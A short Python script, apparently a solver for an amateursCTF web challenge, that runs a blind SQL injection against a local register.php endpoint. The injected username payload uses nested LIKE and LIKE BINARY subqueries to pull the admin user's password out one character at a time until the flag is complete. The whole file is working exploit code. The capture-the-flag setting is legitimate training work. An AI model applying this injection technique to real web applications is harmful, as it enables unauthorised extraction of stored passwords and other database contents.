import requests as http
import string

BASE_URL = "http://localhost:8080"

characters = '_' + string.printable

flag = "amateursCTF{"

def test_char(c):
    test = (flag + c).replace('_', '\\_').replace('%', '\\%')
    create_acc = http.post(f"{BASE_URL}/register.php", data={ 
        'username': f"1' LIKE ((SELECT t.password FROM (SELECT * FROM users t WHERE t.username='admin') as t) LIKE BINARY '{test}%') LIKE '1",
        'password': 'a'
    })
    if "1" in create_acc.text: return True
    else: return False

while flag[-1] != "}":
    for c in string.printable:
        if test_char(c):
            flag += c
            print(flag)
            break
    
